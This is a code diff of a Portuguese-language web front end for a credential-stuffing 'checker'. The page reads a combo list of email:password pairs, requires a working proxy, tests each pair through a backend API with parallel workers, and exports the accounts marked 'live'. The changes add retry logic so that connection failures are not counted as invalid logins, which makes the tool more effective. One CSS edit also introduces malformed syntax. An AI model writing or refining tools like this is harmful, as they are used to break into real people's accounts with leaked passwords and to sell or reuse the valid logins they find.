@@ -58,7 +58,7 @@ main{max-width:1100px;margin:0 auto;padding:2.5rem 1.5rem;position:relative;z-in
 .upload-zone strong{color:var(--text)}
 .file-name{font-size:.82rem;color:var(--accent-hi);margin-top:.4rem;font-weight:500}
 .run-row{display:flex;gap:1rem;align-items:center}
-.btn-start{flex:1;padding:.85rem;background:linear-gradient(135deg,var(--accent),#4f46e5);color:#fff;border:none;border-radius:var(--radius);font-size:.9rem;font-weight:600;cursor:pointer;transition:opacity .2s,transform .15s,box-shadow .2s;box-shadow:0 4px 20px rgba(124,58,237,.35);display:flex;align-items:center;justify-content:center;gap:.5rem}
+.btn-start{flex:1;padding:.85rem;background:linear-gradient(135deg,var(--accent),#4f46e5);color:#fff;border:none;border-radius:var(--radius);font-size:.9rem;font-weight:600;cursor:pointer;transition:opacity .2s,transform:.15s,box-shadow:.2s;box-shadow:0 4px 20px rgba(124,58,237,.35);display:flex;align-items:center;justify-content:center;gap:.5rem}
 .btn-start:hover:not(:disabled){opacity:.9;transform:translateY(-1px);box-shadow:0 8px 28px rgba(124,58,237,.45)}
 .btn-start:disabled{opacity:.45;cursor:not-allowed}
 .btn-start svg{width:18px;height:18px;stroke:#fff;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
@@ -139,28 +139,16 @@ function logout(){fetch('auth.php',{method:'POST',headers:{'Content-Type':'appli
 
 var zone=document.getElementById('uploadZone');
 var fileInput=document.getElementById('listFile');
-
 zone.addEventListener('click',function(){fileInput.click();});
-fileInput.addEventListener('change',function(){
-    if(fileInput.files&&fileInput.files[0]){
-        document.getElementById('fileName').textContent=fileInput.files[0].name+' selecionado';
-        document.getElementById('statusText').textContent='Arquivo carregado · clique em Iniciar Inspeção';
-    }
-});
+fileInput.addEventListener('change',function(){if(fileInput.files&&fileInput.files[0]){document.getElementById('fileName').textContent=fileInput.files[0].name+' selecionado';document.getElementById('statusText').textContent='Arquivo carregado · clique em Iniciar Inspeção';}});
 zone.addEventListener('dragover',function(e){e.preventDefault();zone.classList.add('dragover');});
 zone.addEventListener('dragleave',function(){zone.classList.remove('dragover');});
-zone.addEventListener('drop',function(e){
-    e.preventDefault();zone.classList.remove('dragover');
-    if(e.dataTransfer.files&&e.dataTransfer.files[0]){
-        fileInput.files=e.dataTransfer.files;
-        document.getElementById('fileName').textContent=e.dataTransfer.files[0].name+' selecionado';
-        document.getElementById('statusText').textContent='Arquivo carregado · clique em Iniciar Inspeção';
-    }
-});
+zone.addEventListener('drop',function(e){e.preventDefault();zone.classList.remove('dragover');if(e.dataTransfer.files&&e.dataTransfer.files[0]){fileInput.files=e.dataTransfer.files;document.getElementById('fileName').textContent=e.dataTransfer.files[0].name+' selecionado';document.getElementById('statusText').textContent='Arquivo carregado · clique em Iniciar Inspeção';}});
 
 var accounts=[],proxies=[],activeProxy='',currentIndex=0,liveCount=0,dieCount=0,isRunning=false,allResults=[];
 var THREADS=2;
-var DELAY_BETWEEN_CHECKS=800;
+var DELAY_BETWEEN_CHECKS=1000;
+var MAX_FRONTEND_RETRIES=3;
 
 function readFile(file){return new Promise(function(resolve,reject){var reader=new FileReader();reader.onload=function(e){resolve(e.target.result);};reader.onerror=function(){reject(new Error('Erro ao ler arquivo'));};reader.readAsText(file);});}
 function sleep(ms){return new Promise(function(resolve){setTimeout(resolve,ms);});}
@@ -168,124 +156,75 @@ function sleep(ms){return new Promise(function(resolve){setTimeout(resolve,ms);}
 async function startChecker(){
     if(isRunning)return;
     if(!fileInput.files||fileInput.files.length===0){alert('Selecione um arquivo .txt primeiro.');return;}
-
     var btn=document.getElementById('startBtn');
     btn.disabled=true;
     btn.innerHTML='Carregando...';
-
     try{
-        // 1. Carregar proxies do proxies.txt via init
-        proxies=[];
-        activeProxy='';
-        try{
-            var res=await fetch('api.php?action=init');
-            var d=await res.json();
-            proxies=d.proxies||[];
-        }catch(e){proxies=[];}
-
-        // 2. Se há proxies, testar cada um até encontrar um funcional
+        proxies=[];activeProxy='';
+        try{var res=await fetch('api.php?action=init');var d=await res.json();proxies=d.proxies||[];}catch(e){proxies=[];}
         if(proxies.length>0){
             btn.innerHTML='Testando '+proxies.length+' proxies...';
             document.getElementById('statusText').textContent='Testando proxies...';
-
             for(var p=0;p<proxies.length;p++){
                 document.getElementById('statusText').textContent='Testando proxy '+(p+1)+'/'+proxies.length+'...';
-
-                try{
-                    var fd=new FormData();
-                    fd.append('proxy',proxies[p]);
-                    var pres=await fetch('api.php?action=test_proxy',{method:'POST',body:fd});
-                    var pdata=await pres.json();
-
-                    if(pdata.status==='ok'){
-                        activeProxy=proxies[p];
-                        document.getElementById('statusText').textContent='Proxy conectado! Iniciando inspeção...';
-                        break;
-                    }
-                }catch(e){}
-
+                try{var fd=new FormData();fd.append('proxy',proxies[p]);var pres=await fetch('api.php?action=test_proxy',{method:'POST',body:fd});var pdata=await pres.json();if(pdata.status==='ok'){activeProxy=proxies[p];document.getElementById('statusText').textContent='Proxy conectado! Iniciando...';break;}}catch(e){}
                 await sleep(300);
             }
-
-            // Se nenhum proxy funcionou, BLOQUEAR
-            if(activeProxy===''){
-                alert('Nenhum proxy funcional encontrado em proxies.txt.\n\nCorrija a lista de proxies e tente novamente.');
-                btn.disabled=false;
-                btn.innerHTML='Iniciar Inspeção';
-                document.getElementById('statusText').textContent='Nenhum proxy funcional · bloqueado';
-                return;
-            }
+            if(activeProxy===''){alert('Nenhum proxy funcional encontrado em proxies.txt.\n\nCorrija a lista e tente novamente.');btn.disabled=false;btn.innerHTML='Iniciar Inspeção';document.getElementById('statusText').textContent='Nenhum proxy funcional · bloqueado';return;}
         }
-
-        // 3. Ler arquivo de credenciais
         var text=await readFile(fileInput.files[0]);
         accounts=[];
         var lines=text.split(/\r?\n/);
-        for(var i=0;i<lines.length;i++){
-            var line=lines[i].trim();
-            if(line&&line.indexOf(':')>-1){
-                var idx=line.indexOf(':');
-                var em=line.substring(0,idx).trim();
-                var pw=line.substring(idx+1).trim();
-                if(em.indexOf('@')>-1&&pw.length>0){
-                    accounts.push({email:em,password:pw});
-                }
-            }
-        }
-
-        if(!accounts.length){
-            alert('Nenhuma conta valida encontrada no arquivo.');
-            btn.disabled=false;
-            btn.innerHTML='Iniciar Inspeção';
-            return;
-        }
-
+        for(var i=0;i<lines.length;i++){var line=lines[i].trim();if(line&&line.indexOf(':')>-1){var idx=line.indexOf(':');var em=line.substring(0,idx).trim();var pw=line.substring(idx+1).trim();if(em.indexOf('@')>-1&&pw.length>0){accounts.push({email:em,password:pw});}}}
+        if(!accounts.length){alert('Nenhuma conta valida encontrada.');btn.disabled=false;btn.innerHTML='Iniciar Inspeção';return;}
         document.getElementById('statTotal').textContent=accounts.length;
         document.getElementById('statusText').textContent=accounts.length+' contas carregadas · iniciando...';
         document.getElementById('fileName').textContent=accounts.length+' contas · '+fileInput.files[0].name;
-
-        isRunning=true;
-        currentIndex=0;
-        liveCount=0;
-        dieCount=0;
-        allResults=[];
+        isRunning=true;currentIndex=0;liveCount=0;dieCount=0;allResults=[];
         document.getElementById('liveList').innerHTML='';
         document.getElementById('dieList').innerHTML='';
         updateCounts();
         btn.innerHTML='Inspecionando...';
-
         var workers=[];
         for(var j=0;j<THREADS;j++)workers.push(worker());
         await Promise.all(workers);
-
         document.getElementById('statusText').textContent='Concluido! '+accounts.length+' contas · '+liveCount+' live · '+dieCount+' dead';
         btn.innerHTML='Processo Finalizado';
-    }catch(err){
-        console.error('Erro:',err);
-        document.getElementById('statusText').textContent='Erro: '+err.message;
-        btn.disabled=false;
-        btn.innerHTML='Iniciar Inspeção';
-        isRunning=false;
-    }
+    }catch(err){console.error('Erro:',err);document.getElementById('statusText').textContent='Erro: '+err.message;btn.disabled=false;btn.innerHTML='Iniciar Inspeção';isRunning=false;}
 }
 
 async function worker(){
     while(currentIndex<accounts.length){
         var idx=currentIndex++;
         var ac=accounts[idx];
-
-        await checkAccount(ac.email,ac.password,activeProxy);
-
+        await checkAccountWithRetry(ac.email,ac.password,activeProxy);
         var checked=liveCount+dieCount;
         var pct=Math.round((checked/accounts.length)*100);
         document.getElementById('progressBar').style.width=pct+'%';
         document.getElementById('progressPct').textContent=pct+'%';
         document.getElementById('statusText').textContent='Inspecionando '+checked+' / '+accounts.length+'...';
-
-        if(currentIndex<accounts.length){
-            await sleep(DELAY_BETWEEN_CHECKS);
-        }
+        if(currentIndex<accounts.length){await sleep(DELAY_BETWEEN_CHECKS);}
     }
+}
+
+// CORREÇÃO PRINCIPAL: só aceita "die" se for "Invalid credentials"
+// Se for "Connection failed", tenta novamente até MAX_FRONTEND_RETRIES
+async function checkAccountWithRetry(email,password,proxy){
+    for(var attempt=0;attempt<MAX_FRONTEND_RETRIES;attempt++){
+        if(attempt>0){
+            document.getElementById('statusText').textContent='Retentando '+email+' (tentativa '+(attempt+1)+'/'+MAX_FRONTEND_RETRIES+')...';
+            await sleep(2000);
+        }
+        var result=await checkAccount(email,password,proxy);
+        // Só é conclusivo se: live OU Invalid credentials
+        if(result==='live'||result==='invalid'){return;}
+        // Se chegou aqui, foi "Connection failed" — tenta novamente
+    }
+    // Esgotou todas as tentativas — marca como die com Connection failed
+    allResults.push({email:email,password:password,status:'die'});
+    dieCount++;
+    addToList('dieList',email+':'+password+' · Connection failed (retry esgotado)','die-text');
+    updateCounts();
 }
 
 async function checkAccount(email,password,proxy){
@@ -296,38 +235,30 @@ async function checkAccount(email,password,proxy){
     try{
         var res=await fetch('api.php?action=check',{method:'POST',body:fd});
         var r=await res.json();
-        allResults.push({email:email,password:password,status:r.status});
         if(r.status==='live'){
+            allResults.push({email:email,password:password,status:'live'});
             liveCount++;
             addToList('liveList',email+':'+password,'live-text');
-        }else{
-            dieCount++;
-            addToList('dieList',email+':'+password+' · '+(r.reason||'die'),'die-text');
+            updateCounts();
+            return 'live';
         }
-        updateCounts();
+        if(r.reason==='Invalid credentials'){
+            allResults.push({email:email,password:password,status:'die'});
+            dieCount++;
+            addToList('dieList',email+':'+password+' · Invalid credentials','die-text');
+            updateCounts();
+            return 'invalid';
+        }
+        // Connection failed — NÃO marca como die, retorna para retry
+        return 'connection_failed';
     }catch(e){
-        allResults.push({email:email,password:password,status:'die'});
-        dieCount++;
-        addToList('dieList',email+':'+password+' · ERROR','die-text');
-        updateCounts();
+        return 'connection_failed';
     }
 }
 
 function addToList(id,text,cls){var el=document.getElementById(id);var div=document.createElement('div');div.className=cls;div.textContent=text;el.appendChild(div);el.scrollTop=el.scrollHeight;}
 function updateCounts(){document.getElementById('liveCount').textContent=liveCount;document.getElementById('dieCount').textContent=dieCount;document.getElementById('statLive').textContent=liveCount;document.getElementById('statDie').textContent=dieCount;}
-
-function downloadResults(type){
-    var filtered=type==='lives'?allResults.filter(function(r){return r.status==='live';}):allResults.filter(function(r){return r.status!=='live';});
-    if(filtered.length===0){alert('Nenhum resultado para exportar');return;}
-    var text=filtered.map(function(r){return r.email+':'+r.password;}).join('\n');
-    var blob=new Blob([text],{type:'text/plain'});
-    var a=document.createElement('a');
-    a.href=URL.createObjectURL(blob);
-    a.download=type+'.txt';
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-}
+function downloadResults(type){var filtered=type==='lives'?allResults.filter(function(r){return r.status==='live';}):allResults.filter(function(r){return r.status!=='live';});if(filtered.length===0){alert('Nenhum resultado para exportar');return;}var text=filtered.map(function(r){return r.email+':'+r.password;}).join('\n');var blob=new Blob([text],{type:'text/plain'});var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=type+'.txt';document.body.appendChild(a);a.click();document.body.removeChild(a);}
 </script>
 </body>
 </html>
